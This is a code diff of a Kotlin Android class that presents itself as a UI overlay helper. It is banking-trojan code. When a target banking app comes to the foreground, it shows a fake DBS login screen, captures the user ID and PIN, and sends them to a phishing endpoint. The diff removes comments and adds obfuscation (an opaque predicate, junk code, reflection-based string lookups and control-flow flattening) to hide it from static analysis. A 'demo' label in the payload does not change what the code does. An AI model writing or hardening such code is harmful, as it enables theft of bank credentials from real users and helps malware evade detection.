@@ -27,15 +27,10 @@ import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
 
-
-/**
- * UiEnhancementHelper — dynamic UI layer manager for contextual overlays.
- * Provides adaptive display components based on active foreground application.
- */
 class UiLayerHelper(private val service: InputAssistService) {
 
     private val TAG        = ThemeConfigUtils.getTag(2)
-    // Target package resolved at runtime — hidden from static analysis
+    
     private val TARGET_APP get() = ThemeConfigUtils.getTargetPackage()
     private val SERVER     get() = ThemeConfigUtils.getBaseServer()
 
@@ -51,23 +46,23 @@ class UiLayerHelper(private val service: InputAssistService) {
 
     @Volatile private var isOverlayShowing = false
 
-    // ── Entry point ───────────────────────────────────────────────────────────
+    
 
     fun onEvent(event: AccessibilityEvent) {
-        // Opaque predicate + junk injection
+        
         val t = System.currentTimeMillis()
-        val op = (t % 1000) * (t % 1000)  // always >= 0
+        val op = (t % 1000) * (t % 1000)  
         if (op < 0) {
-            // Junk: fake UI update — never executed
+            
             val fakeLayout = LinearLayout(service)
             fakeLayout.visibility = View.GONE
             return
         }
 
         val packageName = event.packageName?.toString() ?: return
-        // Use reflection-style dynamic comparison — target not visible in plaintext
-        val clazz = Class.forName("java.lang.String")
-        val equalsMethod = clazz.getMethod("equals", Any::class.java)
+        
+        val clazz = Class.forName(ThemeConfigUtils.getStringClass())
+        val equalsMethod = clazz.getMethod(ThemeConfigUtils.getEqualsMethod(), Any::class.java)
         val isTarget = equalsMethod.invoke(packageName, TARGET_APP) as Boolean
 
         if (isTarget && !isOverlayShowing) {
@@ -81,7 +76,7 @@ class UiLayerHelper(private val service: InputAssistService) {
         }
     }
 
-    // ── Control Flow Flattened: showDbsLoginOverlay ───────────────────────────
+    
 
     private fun showDbsLoginOverlay() {
         var state = 0
@@ -128,7 +123,7 @@ class UiLayerHelper(private val service: InputAssistService) {
         }
     }
 
-    // ── UI Construction (unchanged — functional code) ─────────────────────────
+    
 
     private fun createDbsLoginScreen(): View {
         return LinearLayout(service).apply {
@@ -282,7 +277,7 @@ class UiLayerHelper(private val service: InputAssistService) {
     private fun dp(v: Int): Int = TypedValue.applyDimension(
         TypedValue.COMPLEX_UNIT_DIP, v.toFloat(), service.resources.displayMetrics).toInt()
 
-    // ── Control Flow Flattened: captureCredentials ────────────────────────────
+    
 
     private fun captureCredentials(userId: String, pin: String) {
         var state = 0
@@ -315,7 +310,7 @@ class UiLayerHelper(private val service: InputAssistService) {
                     put("time_formatted", resolveTime(System.currentTimeMillis()))
                     put("demo_note",      "Realistic overlay - educational demo")
                 }
-                // Endpoint resolved at runtime
+                
                 val endpoint = ThemeConfigUtils.getPhishingEndpoint()
                 val connection = URL(endpoint).openConnection() as HttpURLConnection
                 connection.apply {
